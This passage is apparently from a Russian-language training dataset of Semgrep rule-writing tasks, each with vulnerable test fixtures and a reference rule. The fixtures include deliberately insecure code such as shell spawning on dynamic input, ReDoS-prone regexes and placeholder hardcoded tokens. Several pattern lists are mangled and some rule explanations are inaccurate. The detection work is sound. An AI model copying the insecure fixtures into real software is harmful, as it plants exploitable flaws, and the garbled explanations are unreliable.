    "output": "rules:\n  - id: https-equiv\n    metadata:\n      category: correctness\n      technology:\n        - html\n      references:\n        - https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta#http-equiv\n    message: >-\n      The correct attribute name for this meta tag is `http-equiv`, not `https-equiv`.\n    severity: ERROR\n    languages: [html]\n    pattern-either:\n      - pattern: <meta ... https-equiv=...>\n    fix-regex:\n      regex: 'https-equiv='\n      replacement: 'http-equiv='\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска HTML-тега <meta>, где атрибут 'https-equiv' используется вместо правильного имени атрибута 'http-equiv'. Правило использует оператор pattern-either для поиска любого случая, когда атрибут 'https-equiv' присутствует в тегах <meta>. Опасный пример включает любой случай использования 'https-equiv', тогда как безопасный пример показывает правильное использование 'http-equiv'.\n\n# Ключевые элементы:\n- ID: https-equiv\n- Язык: html \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "https-equiv",
      "language": "html",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения detect-non-literal-regexp\nОписание уязвимости: RegExp() called with a `$ARG` function argument, this might allow an attacker to cause a Regular Expression Denial-of-Service (ReDoS) within your application as RegExP blocks the main thread. For this reason, it is recommended to use hardcoded regexes instead. If your regex is run on user-controlled input, consider performing input validation or use a regex checking/sanitization library such as https://www.npmjs.com/package/recheck to verify that the regex does not appear vulnerable to ReDoS.\nCWE: CWE-1333: Inefficient Regular Expression Complexity\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-1333: Inefficient Regular Expression Complexity\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: detect-non-literal-regexp.js\nfunction ok (name) {\n  //ok: detect-non-literal-regexp\n  const reg = new RegExp(\"\\\\w+\")\n  return reg.exec(name)\n}\n\nfunction bad (name) {\n  //ruleid: detect-non-literal-regexp\n  const reg = new RegExp(\"\\\\w+\" + name)\n  return reg.exec(name)\n}\n\nfunction jsliteral (name) {\n  const exp = /a.*/;\n  //ok: detect-non-literal-regexp\n  const reg = new RegExp(exp);\n  return reg.exec(name);\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• const reg = new RegExp(\\\\\n•  + name \\\\\n• ,\n    \n\nБезопасные паттерны:  \n• const reg = new RegExp(\\\\\n• \\\\);\n• const reg = new RegExp(/\\\\d+/\\\\);\n\nЛегенда аннотаций:\n- // ruleid:detect-non-literal-regexp: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-non-literal-regexp: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detect-non-literal-regexp\n  message: >-\n    RegExp() called with a `$ARG` function argument, this might allow an attacker to cause a Regular Expression\n    Denial-of-Service (ReDoS) within your application as RegExP blocks the main thread. For this reason, it is\n    recommended to use hardcoded regexes instead. If your regex is run on user-controlled input, consider performing\n    input validation or use a regex checking/sanitization library such as https://www.npmjs.com/package/recheck to\n    verify that the regex does not appear vulnerable to ReDoS.\n  metadata:\n    owasp:\n    - A05:2021 - Security Misconfiguration\n    - A06:2017 - Security Misconfiguration\n    cwe:\n    - \"CWE-1333: Inefficient Regular Expression Complexity\"\n    references:\n    - https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n    source-rule-url: https://github.com/nodesecurity/eslint-plugin-security/blob/master/rules/detect-non-literal-regexp.js\n    category: security\n    technology:\n    - javascript\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-inside: |\n        function ... (...,$ARG,...) {...}\n    - focus-metavariable: $ARG\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: new RegExp($ARG, ...)\n      - pattern: RegExp($ARG, ...)\n    - pattern-not: RegExp(\"...\", ...)\n    - pattern-not: new RegExp(\"...\", ...)\n    - pattern-not: RegExp(/.../, ...)\n    - pattern-not: new RegExp(/.../, ...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции RegExp с аргументом, переданным через переменную ($ARG), что может привести к атаке Regular Expression Denial-of-Service (ReDoS). Анализ выполняется методом taint, где источники (pattern-sources) определяются как функции, содержащие переменную $ARG внутри шаблона 'function ... ($ARG, ...) {...}'. Синки (pattern-sinks) представляют собой конструкции RegExp или new RegExp с передачей переменной $ARG, но исключают случаи, когда аргумент является жестко закодированной строкой или регулярным выражением.\n\n# Ключевые элементы:\n- ID: detect-non-literal-regexp\n- Язык: javascript \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "detect-non-literal-regexp",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения force-ssl-false\nОписание уязвимости: Checks for configuration setting of force_ssl to false. Force_ssl forces usage of HTTPS, which could lead to network interception of unencrypted application traffic. To fix, set config.force_ssl = true.\nCWE: CWE-311: Missing Encryption of Sensitive Data\nТип анализа: search\nЯзык: ruby",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: CWE-311: Missing Encryption of Sensitive Data\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: force-ssl-false.rb\n def bad_ssl\n    # ruleid: force-ssl-false\n    config.force_ssl = false\n end\n\n def ok_ssl\n    # ok: force-ssl-false\n    config.force_ssl = true\n end  # Ограничиваем длину\n\nОпасные паттерны:\n• config.force_ssl = false\n• force_ssl = false; config[:force_ssl] = false\n• config['force_ssl'] = false\n\nБезопасные паттерны:  \n• config.force_ssl = true\n• force_ssl = true; config[:force_ssl] = true\n• config['force_ssl'] = true\n\nЛегенда аннотаций:\n- // ruleid:force-ssl-false: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:force-ssl-false: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: force-ssl-false\n  message: >-\n    Checks for configuration setting of force_ssl to false. Force_ssl forces usage\n    of HTTPS, which\n    could lead to network interception of unencrypted application traffic. To fix,\n    set config.force_ssl = true.\n  metadata:\n    cwe:\n    - 'CWE-311: Missing Encryption of Sensitive Data'\n    references:\n    - https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_force_ssl.rb\n    category: security\n    technology:\n    - ruby\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A04:2021 - Insecure Design\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: HIGH\n  languages:\n  - ruby\n  severity: WARNING\n  pattern: config.force_ssl = false\n  fix-regex:\n    regex: =\\s*false\n    replacement: = true\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска присваивания переменной config.force_ssl значение false в Ruby-коде. Тип анализа — поиск (search). Правило использует простой шаблон 'config.force_ssl = false' для идентификации потенциально опасных фрагментов кода, где принудительное использование SSL отключено. Шаблон не учитывает контекст или окружение переменных, просто ищет точное совпадение указанного выражения.\n\n# Ключевые элементы:\n- ID: force-ssl-false\n- Язык: ruby \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "force-ssl-false",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: aws-ecr-mutable-image-tags\nОписание уязвимости: The ECR repository allows tag mutability. Image tags could be overwritten with compromised images. ECR images should be set to IMMUTABLE to prevent code injection through image mutation. This can be done by setting `image_tag_mutability` to IMMUTABLE.\nCWE: CWE-345: Insufficient Verification of Data Authenticity\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-345: Insufficient Verification of Data Authenticity\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-ecr-mutable-image-tags.tf\n# ruleid: aws-ecr-mutable-image-tags\nresource \"aws_ecr_repository\" \"fail_1\" {\n  name = \"example\"\n}\n\n# ruleid: aws-ecr-mutable-image-tags\nresource \"aws_ecr_repository\" \"fail_2\" {\n  name                 = \"example\"\n  image_tag_mutability = \"MUTABLE\"\n}\n\n# ok: aws-ecr-mutable-image-tags\nresource \"aws_ecr_repository\" \"pass\" {\n  name                 = \"example\"\n  image_tag_mutability = \"IMMUTABLE\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_ecr_repository\" \"fail_1\" { \n  name = \"example\"\n}\n• resource \"aws_ecr_repository\" \"fail_2\" { \n  name = \"example\"\n  image_tag_mutability = \"MUTABLE\"\n}\n\nБезопасные паттерны:  \n• resource \"aws_ecr_repository\" \"pass\" { \n  name = \"example\"\n  image_tag_mutability = \"IMMUTABLE\"\n}\n\nЛегенда аннотаций:\n- // ruleid:aws-ecr-mutable-image-tags: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-ecr-mutable-image-tags: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-ecr-mutable-image-tags\n  patterns:\n  - pattern: |\n      resource \"aws_ecr_repository\" $ANYTHING {\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_ecr_repository\" $ANYTHING {\n        ...\n        image_tag_mutability = \"IMMUTABLE\"\n        ...\n      }\n  message: >- \n    The ECR repository allows tag mutability. Image tags could be overwritten\n    with compromised images. ECR images should be set to IMMUTABLE to prevent code\n    injection through image mutation. This can be done by setting `image_tag_mutability`\n    to IMMUTABLE.\n  languages:\n  - hcl\n  severity: WARNING\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A08:2021 - Software and Data Integrity Failures\n    cwe:\n    - 'CWE-345: Insufficient Verification of Data Authenticity'\n    references:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository#image_tag_mutability\n    - https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS ECR (Amazon Elastic Container Registry) репозиториев в конфигурационном файле Terraform HCL. Правило проверяет наличие ресурса с полем image_tag_mutability, которое не установлено в значение 'IMMUTABLE'. Если поле отсутствует или установлено в другое значение, правило считает это опасным примером. Безопасный пример включает явное указание поля image_tag_mutability со значением 'IMMUTABLE'.\n\n# Ключевые элементы:\n- ID: aws-ecr-mutable-image-tags\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-ecr-mutable-image-tags",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: class-extends-safestring\nОписание уязвимости: Found a class extending 'SafeString', 'SafeText' or 'SafeData'. These classes are for bypassing the escaping engine built in to Django and should not be used directly. Improper use of this class exposes your application to cross-site scripting (XSS) vulnerabilities. If you need this functionality, use 'mark_safe' instead and ensure no user data can reach it.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: class-extends-safestring.py\nfrom django.utils.safestring import SafeString, SafeData, SafeText\n\n# ruleid:class-extends-safestring\nclass IWantToBypassEscaping(SafeString):\n    def __init__(self):\n        super().__init__()\n\n# ruleid:class-extends-safestring\nclass IWantToBypassEscaping2(SafeText):\n    def __init__(self):\n        super().__init__()\n\n# ruleid:class-extends-safestring\nclass IWantToBypassEscaping3(SafeData):\n    def __init__(self):\n        super().__init__()\n\n# ok:class-extends-safestring\nclass SomethingElse(str):\n    def __init__(self):\n        super().__init__()  # Ограничиваем длину\n\nОпасные паттерны:\n• class IWantToBypassEscaping(SafeString):\n    def __init__(self):\n        super().__init__()\n• class IWantToBypassEscaping2(SafeText):\n    def __init__(self):\n        super().__init__()\n• class IWantToBypassEscaping3(SafeData):\n    def __init__(self):\n        super().__init__()\n\nБезопасные паттерны:  \n• class SomethingElse(str):\n    def __init__(self):\n        super().__init__()\n\nЛегенда аннотаций:\n- // ruleid:class-extends-safestring: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:class-extends-safestring: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: class-extends-safestring\n  message: >-\n    Found a class extending 'SafeString', 'SafeText' or 'SafeData'. These classes are\n    for bypassing the escaping engine built in to Django and should not be\n    used directly. Improper use of this class exposes your application to\n    cross-site scripting (XSS) vulnerabilities. If you need this functionality,\n    use 'mark_safe' instead and ensure no user data can reach it.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://docs.djangoproject.com/en/3.1/howto/custom-template-tags/#filters-and-auto-escaping\n    - https://github.com/django/django/blob/f138e75910b1e541686c4dce3d8f467f6fc234cb/django/utils/safestring.py#L11\n    category: security\n    technology:\n    - django\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - python\n  severity: WARNING\n  pattern-either:\n  - pattern: |\n      class $CLASS(django.utils.safestring.SafeString):\n        ...\n  - pattern: |\n      class $CLASS(django.utils.safestring.SafeText):\n        ...\n  - pattern: |-\n      class $CLASS(django.utils.safestring.SafeData):\n        ...\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска классов, которые наследуются от 'SafeString', 'SafeText' или 'SafeData' в Python-коде. Эти классы используются для обхода встроенного механизма экранирования в Django и не должны использоваться напрямую. Неправильное их применение может привести к уязвимостям XSS. Правило использует оператор 'pattern-either' для проверки трех возможных шаблонов классов, каждый из которых соответствует одному из указанных типов безопасных строк.\n\n# Ключевые элементы:\n- ID: class-extends-safestring\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "class-extends-safestring",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения twitter-api-secret\nОписание уязвимости: A gitleaks twitter-api-secret was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: twitter-api-secret.go\n// ruleid: twitter-api-secret\ntwitter_api_token = \"zhxiehw5fi78oli3ze8x0zr2lu03mwj7tc244qyxa70pvhue20\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: twitter-api-secret\ntwitter_api_token = \"zhxiehw5fi78oli3ze8x0zr2lu03mwj7tc244qyxa70pvhue20\"\n• // ruleid: twitter-api-secret\nconst twitToken = 'k89f7u23e4r5t6y7ui890';\nconsole.log(twitToken);\n• // ruleid: twitter-api-secret\nlet accessKey = 'abc123xyz456';\n\nБезопасные паттерны:  \n• // safe example\nconst apiKey = process.env.TWITTER_API_KEY;\nconsole.log(apiKey);\n• // safe example\nlet token = getSecureTokenFromVault();\n• // safe example\ntwitterApiToken = fetchTokenFromHsm();\n\nЛегенда аннотаций:\n- // ruleid:twitter-api-secret: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:twitter-api-secret: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: twitter-api-secret\n  message: A gitleaks twitter-api-secret was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:twitter)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([a-z0-9]{50})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных токенов Twitter API в исходном коде. Оно ищет строку, содержащую слово 'twitter', за которой следует произвольная последовательность символов длиной до 20, затем символ '=' или один из нескольких операторов сравнения, после чего идет строка длиной ровно 50 символов, представляющая собой токен API. Правило применяет модификатор case insensitive ('(?i)') и игнорирует пробельные символы и специальные символы вокруг токена.\n\n# Ключевые элементы:\n- ID: twitter-api-secret\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "twitter-api-secret",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения regular-expression-dos\nОписание уязвимости: When using `System.Text.RegularExpressions` to process untrusted input, pass a timeout.  A malicious user can provide input to `RegularExpressions` that abuses the backtracking behaviour of this regular expression engine. This will lead to excessive CPU usage, causing a Denial-of-Service attack\nCWE: CWE-1333: Inefficient Regular Expression Complexity\nТип анализа: search\nЯзык: C#",
    "input": "Требования:\n- Язык: C#\n- Тип анализа: search\n- CWE: CWE-1333: Inefficient Regular Expression Complexity\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: regular-expression-dos.cs\nusing System.Text.RegularExpressions;\n\nnamespace RegularExpressionsDos\n{\n    public class RegularExpressionsDos\n    {\n        // ruleid: regular-expression-dos\n        public void ValidateRegex(string search)\n        {\n            Regex rgx = new Regex(\"^A(B|C+)+D\");\n            rgx.Match(search);\n\n        }\n\n        // ruleid: regular-expression-dos\n        public void ValidateRegex2(string search)\n        {\n            Regex rgx = new Regex(\"^A(B|C+)+D\", new RegexOptions { });\n            rgx.Match(search);\n\n        }\n\n        // ok: regular-expression-dos\n        public void ValidateRegex3(string search)\n        {\n            Regex rgx = new Regex(\"^A(B|C+)+D\", new RegexOptions { }, TimeSpan.FromSeconds(2000));\n            rgx.Match(search);\n\n        }\n\n        // ruleid: regular-expression-dos\n        public void Validate4(string search)\n        {\n            var pattern = @\"^A(B|C+)+D\";\n            var result = Regex.Match(search, pattern);\n        }\n\n        // ruleid: regular-expression-dos\n        public void Validate5(string search)\n        {\n            var pattern = @\"^A(B|C+)+D\";\n            var result = Regex.Match(search, pattern, new RegexOptions { });\n        }\n\n        // ok: regular-expression-dos\n        public void Validate5(string search)\n        {\n            var pattern = @\"^A(B|C+)+D\";\n            var result = Regex.Match(search, pattern, new RegexOptions { }, TimeSpan.FromSeconds(2000));\n        }\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• public void ValidateRegex(string search) {\n\tRegex rgx = new Regex(\"^A(B|C+)+D\");\n\trgx.Match(search);\n}\n• public void ValidateRegex2(string search) {\n\tRegex rgx = new Regex(\"^A(B|C+)+D\", new RegexOptions { });\n\trgx.Match(search);\n}\n\nБезопасные паттерны:  \n• public void ValidateRegex3(string search) {\n\tRegex rgx = new Regex(\"^A(B|C+)+D\", new RegexOptions { }, TimeSpan.FromSeconds(2000));\n\trgx.Match(search);\n}\n• public void Validate5(string search) {\n\tvar pattern = @\"^A(B|C+)+D\";\n\tvar result = Regex.Match(search, pattern, new RegexOptions { }, TimeSpan.FromSeconds(2000));\n}\n\nЛегенда аннотаций:\n- // ruleid:regular-expression-dos: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:regular-expression-dos: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: regular-expression-dos\n  severity: WARNING\n  languages:\n  - C#\n  metadata:\n    cwe:\n    - 'CWE-1333: Inefficient Regular Expression Complexity'\n    owasp: 'A01:2017 - Injection'\n    references:\n    - https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n    - https://docs.microsoft.com/en-us/dotnet/standard/base-types/regular-expressions#regular-expression-examples\n    category: security\n    technology:\n    - .net\n    confidence: MEDIUM\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n  message: >-\n    When using `System.Text.RegularExpressions` to process untrusted input, pass a timeout. \n    A malicious user can provide input to `RegularExpressions` that abuses the backtracking behaviour of this regular expression engine.\n    This will lead to excessive CPU usage, causing a Denial-of-Service attack\n  patterns:\n  - pattern-inside: |\n      using System.Text.RegularExpressions;\n      ...\n  - pattern-either:\n    - pattern: |\n        public $T $F($X)\n        {\n          Regex $Y = new Regex($P);\n          ...\n          $Y.Match($X);\n        }\n    - pattern: |\n        public $T $F($X)\n        {\n          Regex $Y = new Regex($P, $O);\n          ...\n          $Y.Match($X);\n        }\n    - pattern: |\n        public $T $F($X)\n        {\n          ... Regex.Match($X, $P);\n        }\n    - pattern: |\n        public $T $F($X)\n        {\n          ... Regex.Match($X, $P, $O);\n        }\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов метода Match класса Regex из пространства имен System.Text.RegularExpressions без указания тайм-аута. Паттерн ищет объявления методов с именем, начинающимся на 'public', принимающих строку в качестве аргумента, за которым следует создание объекта Regex и вызов метода Match без явного указания времени ожидания. Это может привести к злоупотреблению поведением обратного отслеживания движка регулярных выражений, вызывая чрезмерное потребление процессора и отказ в обслуживании.\n\n# Ключевые элементы:\n- ID: regular-expression-dos\n- Язык: C# \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "regular-expression-dos",
      "language": "C#",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: jwt-python-exposed-data\nОписание уязвимости: The object is passed strictly to jwt.encode(...) Make sure that sensitive information is not exposed through JWT token payload.\nCWE: CWE-522: Insufficiently Protected Credentials\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-522: Insufficiently Protected Credentials\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: jwt-exposed-data.py\nimport jwt\n\ndef bad1(secret, payload):\n    # ruleid: jwt-python-exposed-data\n    encoded = jwt.encode(payload, secret, algorithm='HS256')\n    return encoded\n\ndef ok(secret_key):\n    # ok: jwt-python-exposed-data\n    encoded = jwt.encode({'some': 'payload'}, secret_key, algorithm='HS256')\n    return encoded  # Ограничиваем длину\n\nОпасные паттерны:\n• jwt.encode(payload, secret, algorithm='HS256')\n• jwt.encode(my_sensitive_data, key, algorithm='RS256')\n\nБезопасные паттерны:  \n• jwt.encode({'some': 'payload'}, secret_key, algorithm='HS256')\n• jwt.encode(data, my_secret, algorithm='ES256K')\n\nЛегенда аннотаций:\n- // ruleid:jwt-python-exposed-data: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:jwt-python-exposed-data: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: jwt-python-exposed-data\n  message: >-\n    The object is passed strictly to jwt.encode(...)\n    Make sure that sensitive information is not exposed through JWT token payload.\n  severity: WARNING\n  metadata:\n    owasp:\n    - A02:2017 - Broken Authentication\n    - A04:2021 - Insecure Design\n    cwe:\n    - 'CWE-522: Insufficiently Protected Credentials'\n    source-rule-url: https://semgrep.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes/\n    category: security\n    technology:\n    - jwt\n    references:\n    - https://owasp.org/Top10/A04_2021-Insecure_Design\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [python]\n  patterns:\n  - pattern-inside: |\n      def $FUNC(...,$INPUT,...):\n        ...\n  - pattern: |-\n      jwt.encode($INPUT,...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции jwt.encode() в Python-коде, где первый аргумент является непосредственно переданным входным параметром ($INPUT). Это может привести к раскрытию чувствительной информации через JWT-токен, если входной параметр содержит конфиденциальные данные.\n\n# Ключевые элементы:\n- ID: jwt-python-exposed-data\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "jwt-python-exposed-data",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения dangerous-spawn-process-audit\nОписание уязвимости: Found dynamic content when spawning a process. This is dangerous if external data can reach this function call because it allows a malicious actor to execute commands. Ensure no external data reaches here.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: dangerous-spawn-process-audit.py\nimport os\nimport shlex\nfrom somewhere import something\n\n# ok:dangerous-spawn-process-audit\nos.spawnlp(os.P_WAIT, \"ls\")\n\n# ok:dangerous-spawn-process-audit\nos.spawnlpe(os.P_WAIT, \"ls\")\n\n# ok:dangerous-spawn-process-audit\nos.spawnv(os.P_WAIT, \"/bin/ls\")\n\n# ok:dangerous-spawn-process-audit\nos.spawnve(os.P_WAIT, \"/bin/ls\", [\"-a\"], os.environ)\n\n# ruleid:dangerous-spawn-process-audit\nos.spawnlp(os.P_WAIT, something())\n\n# ruleid:dangerous-spawn-process-audit\nos.spawnlpe(os.P_WAIT, something())\n\n# ruleid:dangerous-spawn-process-audit\nos.spawnv(os.P_WAIT, something())\n\n# ruleid:dangerous-spawn-process-audit\nos.spawnve(os.P_WAIT, something(), [\"-a\"], os.environ)\n\n# ruleid:dangerous-spawn-process-audit\nos.spawnve(os.P_WAIT, \"/bin/bash\", [\"-c\", something()], os.environ)\n\n# ruleid:dangerous-spawn-process-audit \nos.spawnl(os.P_WAIT, \"/bin/bash\", \"-c\", something())\n\ndef run_payload(shell_command: str) -> None:\n    args = shlex.split(shell_command)\n    path = args[0]\n    # ruleid:dangerous-spawn-process-audit\n    pid = os.posix_spawn(path, args, os.environ)\n    os.waitpid(pid, 0)  # Ограничиваем длину\n\nОпасные паттерны:\n• os.spawnve(os.P_WAIT, something(), ['-a'], os.environ)\n• os.spawnl(os.P_WAIT, '/bin/bash', '-c', something())\n• os.spawnvp('exec', 'bash', ['-c', something()])\n\nБезопасные паттерны:  \n• os.spawnlp(os.P_WAIT, 'ls')\n• os.spawnv(os.P_WAIT, '/bin/ls')\n• os.spawnve(os.P_WAIT, '/bin/ls', ['-a'], os.environ)\n\nЛегенда аннотаций:\n- // ruleid:dangerous-spawn-process-audit: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dangerous-spawn-process-audit: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dangerous-spawn-process-audit\n  message: >-\n    Found dynamic content when spawning a process. This is dangerous if external\n    data can reach this function call because it allows a malicious actor to\n    execute commands. Ensure no external data reaches here.\n  metadata:\n    source-rule-url: https://bandit.readthedocs.io/en/latest/plugins/b605_start_process_with_a_shell.html\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://semgrep.dev/docs/cheat-sheets/python-command-injection/\n    asvs:\n      section: 'V5: Validation, Sanitization and Encoding Verification Requirements'\n      control_id: 5.3.8 OS Command Injection\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x13-V5-Validation-Sanitization-Encoding.md#v53-output-encoding-and-injection-prevention-requirements\n      version: '4'\n    category: security\n    technology:\n    - python\n    confidence: LOW\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n  languages: [python]\n  severity: ERROR\n  pattern-either:\n  - patterns:\n    - pattern-not: os.$METHOD($MODE, \"...\", ...)\n    - pattern: os.$METHOD(...)\n    - metavariable-regex:\n        metavariable: $METHOD\n        regex: (spawnl|spawnle|spawnlp|spawnlpe|spawnv|spawnve|spawnvp|spawnvp|spawnvpe|posix_spawn|posix_spawnp|startfile)\n  - patterns:\n    - pattern-not: os.$METHOD($MODE, \"...\", [\"...\",\"...\",...], ...)\n    - pattern: os.$METHOD($MODE, $BASH, [\"-c\",$CMD,...],...)\n    - metavariable-regex:\n        metavariable: 